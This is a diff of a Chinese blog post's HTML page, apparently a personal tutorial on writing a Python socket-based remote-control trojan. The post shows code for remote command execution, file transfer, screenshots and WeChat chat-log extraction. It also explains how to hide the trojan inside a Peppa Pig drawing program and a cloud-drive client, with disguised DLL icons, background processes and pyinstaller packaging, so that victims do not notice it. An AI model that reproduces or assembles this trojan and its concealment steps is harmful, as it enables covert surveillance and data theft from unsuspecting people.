@@ -73,7 +73,7 @@
   <meta itemprop="description" content="一个由Python语言编写的基于Socket的远程控制程序">
   <meta itemprop="datePublished" content="2023-11-29T00:00:00+00:00">
   <meta itemprop="dateModified" content="2023-11-29T00:00:00+00:00">
-  <meta itemprop="wordCount" content="5322">
+  <meta itemprop="wordCount" content="5271">
   <meta itemprop="keywords" content="Python,Socket">
 
   
@@ -182,13 +182,13 @@
 <li>远程文件下载</li>
 <li>获取远程主机截屏</li>
 </ul>
-<p>在学习网络安全技术的过程中，了解到了计算机病毒、蠕虫和木马等知识，这其中木马应该是最好实现的一个，于是便想到写一个木马
-在众多木马的类型中，结合学习到的网络编程知识，于是便有了这一个基于Socket实现的远程控制程序
-在后续，可以将这个远控程序写入其他客户端程序中（比如之前的量子加密网盘项目），只要对方打开了桌面程序，就能远程连接</p>
+<p>在学习网络安全技术的过程中，了解到了计算机病毒、蠕虫和木马等知识，这其中木马应该是最好实现的一个，于是便想到写一个木马</p>
+<p>在众多木马的类型中，结合学习到的网络编程知识，于是便有了这一个基于Socket实现的远程控制程序</p>
+<p>在后续，可以将这个远控程序写入其他客户端程序中（比如之前的量子加密网盘项目），只要对方打开了桌面程序，就能远程连接</p>
 <h2 id="实现过程">实现过程</h2>
 <h3 id="最简单的socket程序">最简单的Socket程序</h3>
-<p>首先，整个程序的框架就是基于Socket的TCP传输，先写一个最简单的Socket程序
-<strong>Server端：</strong></p>
+<p>首先，整个程序的框架就是基于Socket的TCP传输，先写一个最简单的Socket程序</p>
+<p><strong>Server端：</strong></p>
 <div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">socket</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>socket_server <span style="color:#666">=</span> socket<span style="color:#666">.</span>socket()
@@ -221,37 +221,37 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#a2f">print</span>(<span style="color:#b44">&#39;服务端回复的消息：&#39;</span>, recv_data<span style="color:#666">.</span>decode(<span style="color:#b44">&#39;UTF-8&#39;</span>))
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>socker_client<span style="color:#666">.</span>close()
-</span></span></code></pre></div><p>以上是最简单的一个Socket程序，实现了两台主机之间相互传递文字信息。
-但是在这个程序中，同样存在很多的问题，比如：</p>
+</span></span></code></pre></div><p>以上是最简单的一个Socket程序，实现了两台主机之间相互传递文字信息。</p>
+<p>但是在这个程序中，同样存在很多的问题，比如：</p>
 <ol>
 <li>传输的消息可能会超过1024</li>
 <li>没有任何异常抛出机制，在Socket通信的过程中，一定会存在丢包、失去连接、超时等问题</li>
-<li>…………
-这些问题如果只是在上面这样一个简单程序中，基本不会有问题，但是一旦程序实现的功能多了，代码量大了，这些问题都至关重要，都需要在后续的代码中注意，不然找bug会很痛苦😢</li>
+<li>…………</li>
 </ol>
+<p>这些问题如果只是在上面这样一个简单程序中，基本不会有问题，但是一旦程序实现的功能多了，代码量大了，这些问题都至关重要，都需要在后续的代码中注意，不然找bug会很痛苦😢</p>
 <blockquote>
-<p>需要强调的是，在此程序中，我将服务端作为主动执行端，客户端作为被动执行端，也就是服务端发送指令，客户端根据指令进行操作并返回服务端
-对于木马程序，同样可以理解为，服务端为攻击操纵者，客户端为攻击受害者
-后续的介绍中，都是以此为基础</p>
+<p>需要强调的是，在此程序中，我将服务端作为主动执行端，客户端作为被动执行端，也就是服务端发送指令，客户端根据指令进行操作并返回服务端</p>
+<p>对于木马程序，同样可以理解为，服务端为攻击操纵者，客户端为攻击受害者</p>
+<p>后续的介绍中，都是以此为基础</p>
 </blockquote>
 <h3 id="远程命令执行">远程命令执行</h3>
-<p>学会上面最简单的socket程序之后，接下来就是思考，怎么实现远程的命令执行
-在这里我们可以使用Python中的os模块，os模块提供的就是各种 Python 程序与操作系统进行交互的接口。通过使用os模块，一方面可以方便地与操作系统进行交互，另一方面页可以极大增强代码的可移植性
-Python中的os模块，理论上支持Windows、Linux和Mac OS系统，所以使用os模块，也可以增大我们编写的这个程序的使用范围
-所以远程命令执行的整体流程和框架为：
-{% mermaid %}
-graph TB
-a(服务端等待客户端连接)&ndash;&gt;b(客户端连接上服务端)
-b&ndash;&gt;c(服务端接收到连接并发送指令)
-c&ndash;&gt;d(客户端解析指令并调用OS模块执行)
-{% endmermaid %}</p>
-<p>使用os模块进行命令也十分简单，只需要使用<code>os.system('命令')</code>或者<code>os.popen('命令')</code>就可以实现，
-但是但是，这里不能使用<code>os.system</code>，比如我们执行<code>dir</code>命令，需要返回文件夹内的内容，<font color="#00b0f0">它不能返回命令执行后的内容</font>，而<code>os.popen</code>可以</p>
+<p>学会上面最简单的socket程序之后，接下来就是思考，怎么实现远程的命令执行</p>
+<p>在这里我们可以使用Python中的os模块，os模块提供的就是各种 Python 程序与操作系统进行交互的接口。通过使用os模块，一方面可以方便地与操作系统进行交互，另一方面页可以极大增强代码的可移植性</p>
+<p>Python中的os模块，理论上支持Windows、Linux和Mac OS系统，所以使用os模块，也可以增大我们编写的这个程序的使用范围</p>
+<p>所以远程命令执行的整体流程和框架为：</p>
+<p>{% mermaid %}</p>
+<p>graph TB</p>
+<p>a(服务端等待客户端连接)&ndash;&gt;b(客户端连接上服务端)</p>
+<p>b&ndash;&gt;c(服务端接收到连接并发送指令)</p>
+<p>c&ndash;&gt;d(客户端解析指令并调用OS模块执行)</p>
+<p>{% endmermaid %}</p>
+<p>使用os模块进行命令也十分简单，只需要使用 <code>os.system('命令')</code> 或者 <code>os.popen('命令')</code> 就可以实现.</p>
+<p>但是，这里不能使用<code>os.system</code>，比如我们执行<code>dir</code>命令，需要返回文件夹内的内容，<font color="#00b0f0">它不能返回命令执行后的内容</font>，而<code>os.popen</code>可以</p>
 <blockquote>
-<p>补充：
-python中<code>os.system</code>、<code>os.popen</code>、<code>subprocess.popen</code>都是可以实现系统命令的执行
-但是他们之间也存在区别，<a href="https://blog.csdn.net/bcfdsagbfcisbg/article/details/78134172">参考文章</a>
-总结一下：</p>
+<p>补充：</p>
+<p>python中<code>os.system</code>、<code>os.popen</code>、<code>subprocess.popen</code>都是可以实现系统命令的执行
+但是他们之间也存在区别，<a href="https://blog.csdn.net/bcfdsagbfcisbg/article/details/78134172">参考文章</a></p>
+<p>总结一下：</p>
 <ol>
 <li><code>os.system</code>直接调用标准C的system() 函数，仅仅在一个子终端运行系统命令，而不能获取命令执行后的返回信息</li>
 <li><code>os.popen</code>不仅执行命令而且返回执行后的信息对象(常用于需要获取执行命令后的返回信息)，是通过一个管道文件将结果返回。返回的是 file read 的对象，对其进行读取<code>read</code>的操作可以看到执行的输出</li>
@@ -259,8 +259,8 @@ python中<code>os.system</code>、<code>os.popen</code>、<code>subprocess.popen
 <li><code>commands</code>可以获取返回值和命令的输出结果</li>
 </ol>
 </blockquote>
-<p>所以在这个功能实现中，我选择使用<code>os.popen</code>方法来实现命令执行，使用<code>read</code>方法读取返回的内容
-<strong>Client端执行命令函数:</strong></p>
+<p>所以在这个功能实现中，我选择使用 <code>os.popen</code> 方法来实现命令执行，使用 <code>read</code> 方法读取返回的内容</p>
+<p><strong>Client端执行命令函数:</strong></p>
 <div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">run_cmd</span>(socker_client, cmd):  
 </span></span><span style="display:flex;"><span>    pwd <span style="color:#666">=</span> os<span style="color:#666">.</span>getcwd()  
 </span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span> cmd<span style="color:#666">.</span>startswith(<span style="color:#b44">&#39;cd&#39;</span>):  
@@ -283,32 +283,32 @@ python中<code>os.system</code>、<code>os.popen</code>、<code>subprocess.popen
 </span></span><span style="display:flex;"><span>        result <span style="color:#666">=</span> <span style="color:#b44">&#39;命令执行成功&#39;</span>  
 </span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic"># 把命令回显结果发送给服务端  </span>
 </span></span><span style="display:flex;"><span>    socker_client<span style="color:#666">.</span>send(result<span style="color:#666">.</span>encode(<span style="color:#b44">&#39;UTF-8&#39;</span>))
-</span></span></code></pre></div><p>从上面这个函数实现代码中可以看到，我特意对<code>cd</code>切换目录命令做了单独的判断
-这是因为在Python程序中直接执行<code>cd</code>切换目录是不起作用的，还是会返回当前程序运行的目录位置，所以需要使用<code>os.chdir</code>方法对当前Python程序运行的目录进行切换
-除此之外的其他命令则没有进行单独的判断，直接交给<code>popen</code>执行，并用<code>read</code>方法读取返回信息</p>
+</span></span></code></pre></div><p>从上面这个函数实现代码中可以看到，我特意对 <code>cd</code> 切换目录命令做了单独的判断</p>
+<p>这是因为在Python程序中直接执行 <code>cd</code> 切换目录是不起作用的，还是会返回当前程序运行的目录位置，所以需要使用 <code>os.chdir</code> 方法对当前Python程序运行的目录进行切换</p>
+<p>除此之外的其他命令则没有进行单独的判断，直接交给 <code>popen</code> 执行，并用 <code>read</code> 方法读取返回信息</p>
 <blockquote>
 <p>值得注意的是，<code>popen</code>在执行其他命令会有意想不到的返回值，可能会不返回值，并且一直阻塞，需要根据实际情况单独判断</p>
 </blockquote>
 <p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214229.png" alt="远程执行命令"></p>
 <h3 id="远程下载文件">远程下载文件</h3>
-<p>远程下载文件，需要的是服务端和客户端紧密配合，并且保证通信过程中的同步
-所谓同步，一定是<strong class=chinese>一收一发</strong>的形式，不论是客户端还是服务端，一旦有一端出现了连续两次的发送或者接收，在实际的执行过程中，一定会出现死锁的现象，也就是双方都在等待对方发送消息，双方一直阻塞。
-远程下载文件的整体流程和框架：
-{% mermaid %}
-graph TB
-a[服务端发送下载文件指令并指定文件名称]&ndash;&gt;b[客户端接收下载文件指令]
-b&ndash;&gt;c[客户端搜索文件是否存在]
-c&ndash;&gt;|存在|d[客户端读取文件数据并发送头部信息]
-c&ndash;&gt;|不存在|e[客户端向服务端发送不存在指令]
-d&ndash;&gt;f[服务端接收头部信息发送确认信息]
-e&ndash;&gt;h[双方退出下载文件流程]
-f&ndash;&gt;f1[客户端接收确认信息并发送文件数据]
-f1&ndash;&gt;f2[服务端接收文件数据并写入本地文件]
-{% endmermaid %}</p>
-<p>这其中有一步是发送和确认文件的头部信息，这是为了告诉服务端所要接收的文件的文件大小和名称，以便写入文件。
-当然这一步是可以省略的，服务端可以根据输入的指令信息得知文件的名称
-在此程序中，使用<code>get 文件名称</code>的方式告诉双方，我需要进行下载文件的流程
-<strong>Server端get函数：</strong></p>
+<p>远程下载文件，需要的是服务端和客户端紧密配合，并且保证通信过程中的同步</p>
+<p>所谓同步，一定是<strong class=chinese>一收一发</strong>的形式，不论是客户端还是服务端，一旦有一端出现了连续两次的发送或者接收，在实际的执行过程中，一定会出现死锁的现象，也就是双方都在等待对方发送消息，双方一直阻塞。</p>
+<p>远程下载文件的整体流程和框架：</p>
+<p>{% mermaid %}</p>
+<p>graph TB</p>
+<p>a[服务端发送下载文件指令并指定文件名称]&ndash;&gt;b[客户端接收下载文件指令]</p>
+<p>b&ndash;&gt;c[客户端搜索文件是否存在]</p>
+<p>c&ndash;&gt;|存在|d[客户端读取文件数据并发送头部信息]</p>
+<p>c&ndash;&gt;|不存在|e[客户端向服务端发送不存在指令]</p>
+<p>d&ndash;&gt;f[服务端接收头部信息发送确认信息]</p>
+<p>e&ndash;&gt;h[双方退出下载文件流程]</p>
+<p>f&ndash;&gt;f1[客户端接收确认信息并发送文件数据]</p>
+<p>f1&ndash;&gt;f2[服务端接收文件数据并写入本地文件]</p>
+<p>{% endmermaid %}</p>
+<p>这其中有一步是发送和确认文件的头部信息，这是为了告诉服务端所要接收的文件的文件大小和名称，以便写入文件。</p>
+<p>当然这一步是可以省略的，服务端可以根据输入的指令信息得知文件的名称</p>
+<p>在此程序中，使用 <code>get 文件名称</code> 的方式告诉双方，我需要进行下载文件的流程</p>
+<p><strong>Server端get函数：</strong></p>
 <div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">get_file</span>(conn):  
 </span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic"># 文件不存在的情况  </span>
 </span></span><span style="display:flex;"><span>    rev <span style="color:#666">=</span> conn<span style="color:#666">.</span>recv(<span style="color:#666">1024</span>)  
@@ -379,29 +379,29 @@ f1&ndash;&gt;f2[服务端接收文件数据并写入本地文件]
 </span></span><span style="display:flex;"><span>        conn<span style="color:#666">.</span>send(<span style="color:#b44">b</span><span style="color:#b44">&#39;file_not_exist&#39;</span>)
 </span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214251.png" alt="下载文件"></p>
 <h3 id="远程上传文件">远程上传文件</h3>
-<p>在这一部分，整体的流程和上面的远程文件下载基本一致，就是将上方服务端和客户端的流程对调
-这里就不过多介绍，代码是一样的
-在此程序中使用<code>put 文件名称</code>的形式，告诉双方我需要进入上传文件的流程
-<img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214303.png" alt="上传文件"></p>
+<p>在这一部分，整体的流程和上面的远程文件下载基本一致，就是将上方服务端和客户端的流程对调</p>
+<p>这里就不过多介绍，代码是一样的</p>
+<p>在此程序中使用 <code>put 文件名称</code> 的形式，告诉双方我需要进入上传文件的流程</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214303.png" alt="上传文件"></p>
 <h3 id="远程获取屏幕截图">远程获取屏幕截图</h3>
-<p>Python获取屏幕截图的方式很多，比如PIL中的ImageGrab模块、windows API、PyQt、pyautogui等等
-<a href="https://blog.csdn.net/c_lanxiaofang/article/details/126412158">参考文章</a>
-在此程序中使用了PIL中的ImageGrab模块，原因就是操作十分简单，缺点是效率较低，但是对于我们这个程序来说，几乎感觉不出差别
-ImageGrab模块只需要两条命令就能搞定全屏截图，十分方便</p>
+<p>Python获取屏幕截图的方式很多，比如PIL中的ImageGrab模块、windows API、PyQt、pyautogui等等</p>
+<p><a href="https://blog.csdn.net/c_lanxiaofang/article/details/126412158">参考文章</a></p>
+<p>在此程序中使用了PIL中的ImageGrab模块，原因就是操作十分简单，缺点是效率较低，但是对于我们这个程序来说，几乎感觉不出差别</p>
+<p>ImageGrab模块只需要两条命令就能搞定全屏截图，十分方便</p>
 <div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>im <span style="color:#666">=</span> ImageGrab<span style="color:#666">.</span>grab()
 </span></span><span style="display:flex;"><span>im<span style="color:#666">.</span>save(file_name)
-</span></span></code></pre></div><p>远程获取屏幕截图的整体流程和框架：
-{% mermaid %}
-graph TB
-a[服务端发送截屏指令并进入截屏流程]&ndash;&gt;b[客户端接收截屏指令并进入截屏流程]
-b&ndash;&gt;c[服务端发送&rsquo;start&rsquo;指令]
-c&ndash;&gt;d[客户端端接收&rsquo;start&rsquo;指令并截屏保存文件]
-d&ndash;&gt;f[进入get下载文件流程]
-c&ndash;&gt;f
-f&ndash;&gt;e[客户端删除截屏文件,双方退出截屏流程]
-{% endmermaid %}</p>
-<p>在此程序中，使用<code>screen</code>的方式告诉双方，我需要进行截屏的流程
-<strong>Server端screen函数：</strong></p>
+</span></span></code></pre></div><p>远程获取屏幕截图的整体流程和框架：</p>
+<p>{% mermaid %}</p>
+<p>graph TB</p>
+<p>a[服务端发送截屏指令并进入截屏流程]&ndash;&gt;b[客户端接收截屏指令并进入截屏流程]</p>
+<p>b&ndash;&gt;c[服务端发送&rsquo;start&rsquo;指令]</p>
+<p>c&ndash;&gt;d[客户端端接收&rsquo;start&rsquo;指令并截屏保存文件]</p>
+<p>d&ndash;&gt;f[进入get下载文件流程]</p>
+<p>c&ndash;&gt;f</p>
+<p>f&ndash;&gt;e[客户端删除截屏文件,双方退出截屏流程]</p>
+<p>{% endmermaid %}</p>
+<p>在此程序中，使用 <code>screen</code> 的方式告诉双方，我需要进行截屏的流程</p>
+<p><strong>Server端screen函数：</strong></p>
 <div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">screen_shot</span>(conn):  
 </span></span><span style="display:flex;"><span>    rev <span style="color:#666">=</span> conn<span style="color:#666">.</span>recv(<span style="color:#666">1024</span>)  
 </span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">if</span> rev <span style="color:#666">!=</span> <span style="color:#b44">b</span><span style="color:#b44">&#39;screen&#39;</span>:  
@@ -426,10 +426,10 @@ f&ndash;&gt;e[客户端删除截屏文件,双方退出截屏流程]
 </span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214314.png" alt="截屏">
 <img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214330.png" alt="截取的图片拉取到本地"></p>
 <h3 id="获取微信数据">获取微信数据</h3>
-<p>这里功能是基于Github开源项目：<a href="https://github.com/xaoyaoo/PyWxDump">PyWxDump</a>
-其提供了一系列获取微信数据信息、聊天记录等Python接口
-利用这个python项目，可以很容易获取到微信数据
-如 获取微信基本信息：</p>
+<p>这里功能是基于Github开源项目：<a href="https://github.com/xaoyaoo/PyWxDump">PyWxDump</a></p>
+<p>其提供了一系列获取微信数据信息、聊天记录等Python接口</p>
+<p>利用这个python项目，可以很容易获取到微信数据</p>
+<p>如获取微信基本信息：</p>
 <div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">def</span> <span style="color:#00a000">get_wechat_info</span>(conn):
 </span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic"># 读取文件中的json数据</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">with</span> <span style="color:#a2f">open</span>(<span style="color:#b44">&#39;version_list.json&#39;</span>, <span style="color:#b44">&#39;r&#39;</span>, encoding<span style="color:#666">=</span><span style="color:#b44">&#39;UTF-8&#39;</span>) <span style="color:#a2f;font-weight:bold">as</span> f:
@@ -553,10 +553,10 @@ f&ndash;&gt;e[客户端删除截屏文件,双方退出截屏流程]
 </span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214405.png" alt="在浏览器中查看聊天记录"></p>
 <h2 id="木马程序">木马程序</h2>
 <h3 id="peppa-pig">peppa-pig</h3>
-<p>完成上面的几个功能就已经具备简单远控木马的特征了，接着就是需要将这个程序隐藏起来，让对方察觉不到这个程序的存在
-我的思路是将这个远程控制的程序隐藏在其他应用中，并且以多线程或者多进程的方式异步的运行这个程序，并且在对方关闭应用之后，这个远程程序依旧能在后台运行
-首先我找到一个利用海龟绘图绘制小猪佩奇的程序，程序是<a href="https://github.com/jackfrued/Python-100-Days">Python-100-Days</a>这个项目中，接着我将远控程序引入，以多线程的方式启动，最后将整个程序<a href="https://blog.csdn.net/weixin_43804047/article/details/119704965">打包成exe可执行程序</a>
-<img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203844.png" alt="绘制小猪佩奇程序">
+<p>完成上面的几个功能就已经具备简单远控木马的特征了，接着就是需要将这个程序隐藏起来，让对方察觉不到这个程序的存在</p>
+<p>我的思路是将这个远程控制的程序隐藏在其他应用中，并且以多线程或者多进程的方式异步的运行这个程序，并且在对方关闭应用之后，这个远程程序依旧能在后台运行</p>
+<p>首先我找到一个利用海龟绘图绘制小猪佩奇的程序，程序是 <a href="https://github.com/jackfrued/Python-100-Days">Python-100-Days</a> 这个项目中，接着我将远控程序引入，以多线程的方式启动，最后将整个程序<a href="https://blog.csdn.net/weixin_43804047/article/details/119704965">打包成exe可执行程序</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203844.png" alt="绘制小猪佩奇程序">
 添加多线程代码：</p>
 <div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span> __name__ <span style="color:#666">==</span> <span style="color:#b44">&#39;__main__&#39;</span>:  
 </span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic"># 多线程  </span>
@@ -571,13 +571,13 @@ f&ndash;&gt;e[客户端删除截屏文件,双方退出截屏流程]
 </span></span></code></pre></div><p>需要加入资源时</p>
 <div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>pyinstaller <span style="color:#666">-F</span> -w -n pig -i .\icon.ico --add-data=<span style="color:#b44">&#34;.\assets\version_list.json;.&#34;</span> .\peppa_pig.py
 </span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203909.png" alt="打包成exe文件">
-对方点击运行这个程序之后，远程控制程序同时以线程的形式进行运行，当对象关闭绘图框时，远控程序的线程还是会在后台继续运行，对方只要不打开任务管理器时难以察觉到的
-<img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203930.png" alt="在后台运行的pig.exe"></p>
+对方点击运行这个程序之后，远程控制程序同时以线程的形式进行运行，当对象关闭绘图框时，远控程序的线程还是会在后台继续运行，对方只要不打开任务管理器时难以察觉到的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203930.png" alt="在后台运行的pig.exe"></p>
 <h3 id="量子加密网盘客户端">量子加密网盘客户端</h3>
-<p>结合之前写的一个<a href="https://pi3yyy.love/archives/7c353064.html">量子加密网盘客户端</a>的项目，我也将木马引入
-这次的引入方式同上面的有所不同，由于上面以多线程的方式引入，而在Windows任务管理器中只会显示进程，所以还是pig.exe的程序正在运行，对方容易察觉到
-这个我们换个思路，先将远控程序打包成exe可执行文件，替换其图标为动态链接库的图标，并且将名字设置为很长的一串。
-接着在量子加密网盘客户端程序中，以<font color="#00b0f0">多进程</font>的方式执行这个远控exe程序，最后将量子加密网盘客户端打包成exe文件，将远控程序藏在打包后的依赖文件夹中</p>
+<p>结合之前写的一个<a href="https://pi3yyy.love/archives/7c353064.html">量子加密网盘客户端</a>的项目，我也将木马引入</p>
+<p>这次的引入方式同上面的有所不同，由于上面以多线程的方式引入，而在Windows任务管理器中只会显示进程，所以还是pig.exe的程序正在运行，对方容易察觉到</p>
+<p>这个我们换个思路，先将远控程序打包成exe可执行文件，替换其图标为动态链接库的图标，并且将名字设置为很长的一串。</p>
+<p>接着在量子加密网盘客户端程序中，以<font color="#00b0f0">多进程</font>的方式执行这个远控exe程序，最后将量子加密网盘客户端打包成exe文件，将远控程序藏在打包后的依赖文件夹中</p>
 <p>添加多进程代码</p>
 <div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span> __name__ <span style="color:#666">==</span> <span style="color:#b44">&#39;__main__&#39;</span>:  
 </span></span><span style="display:flex;"><span>	<span style="color:#080;font-style:italic"># 多进程</span>
@@ -586,9 +586,9 @@ f&ndash;&gt;e[客户端删除截屏文件,双方退出截屏流程]
 </span></span><span style="display:flex;"><span>    run()
 </span></span></code></pre></div><p>使用pyinstaller进行打包</p>
 <div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>pyinstaller -D -w -n QE_Network_Drive -i icon.ico flet_GUI.py
-</span></span></code></pre></div><p>在这个过程中，我尝试了很多的办法，都会出现一个问题：在Pycharm下运行没有问题，但是打包后运行exe程序，整个电脑直接卡死，内存爆满，最后直接重启。
-解决办法就是<a href="https://blog.csdn.net/Owen_goodman/article/details/115521388">使用multiprocessing.freeze_support()</a>
-<img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201225942.png" alt="打包之后文件结构">
+</span></span></code></pre></div><p>在这个过程中，我尝试了很多的办法，都会出现一个问题：在Pycharm下运行没有问题，但是打包后运行exe程序，整个电脑直接卡死，内存爆满，最后直接重启。</p>
+<p>解决办法就是<a href="https://blog.csdn.net/Owen_goodman/article/details/115521388">使用multiprocessing.freeze_support()</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201225942.png" alt="打包之后文件结构">
 <img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201230034.png" alt="隐藏在依赖文件中的远控程序">
 <img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201230240.png" alt="关闭云盘客户端后依旧在后台运行的远控程序"></p>
 <p>不过后续还是需要将这个远控程序图标和名称改的更加合适一点，毕竟dll动态链接库怎么可能在后台运行</p>
